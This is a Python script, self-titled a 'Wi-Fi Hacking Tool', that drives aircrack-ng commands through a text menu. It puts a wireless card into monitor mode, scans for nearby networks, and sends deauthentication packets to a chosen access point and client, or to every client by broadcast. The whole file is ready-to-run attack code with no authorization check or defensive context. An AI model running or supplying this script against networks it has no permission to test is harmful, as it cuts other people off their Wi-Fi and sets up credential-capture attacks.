import subprocess

def enable_monitor_mode():
    """Enable monitor mode on a wireless interface."""
    interface = input("Enter your wireless interface name (e.g., wlan0): ")
    print(f"Stopping interfering processes on {interface}...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    
    print(f"Enabling monitor mode on {interface}...")
    subprocess.run(["sudo", "airmon-ng", "start", interface])
    
    print("Verifying interface mode...")
    subprocess.run(["iwconfig"])
    return interface + "mon"  # Return the monitor mode interface name

def scan_wifi(interface):
    """Scan for Wi-Fi networks."""
    print("Scanning for Wi-Fi networks...")
    subprocess.run(["sudo", "airodump-ng", interface])

def deauth_attack(interface):
    """Perform a deauthentication attack."""
    target_bssid = input("Enter target BSSID (e.g., AA:BB:CC:DD:EE:FF): ")
    client_mac = input("Enter target client MAC (leave blank for broadcast): ")
    deauth_count = input("Enter the number of deauth packets to send (e.g., 10): ")

    if client_mac.strip() == "":
        client_mac = "FF:FF:FF:FF:FF:FF"
    
    print(f"Launching deauth attack on {target_bssid} targeting {client_mac}...")
    try:
        subprocess.run([
            "sudo", "aireplay-ng", "--deauth", deauth_count, 
            "-a", target_bssid, "-c", client_mac, interface
        ])
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")

def main():
    """Main menu for the Wi-Fi hacking tool."""
    print("Wi-Fi Hacking Tool")
    monitor_interface = None  # Initialize monitor mode interface variable
    
    while True:
        print("\nMenu:")
        print("1. Enable Monitor Mode")
        print("2. Scan Wi-Fi Networks")
        print("3. Perform Deauthentication Attack")
        print("4. Exit")
        
        choice = input("Enter your choice: ")
        
        if choice == "1":
            monitor_interface = enable_monitor_mode()
        elif choice == "2":
            if monitor_interface:
                scan_wifi(monitor_interface)
            else:
                print("Please enable monitor mode first!")
        elif choice == "3":
            if monitor_interface:
                deauth_attack(monitor_interface)
            else:
                print("Please enable monitor mode first!")
        elif choice == "4":
            print("Exiting the tool. Stopping monitor mode...")
            if monitor_interface:
                # Stop monitor mode
                subprocess.run(["sudo", "airmon-ng", "stop", monitor_interface])
            print("Goodbye!")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
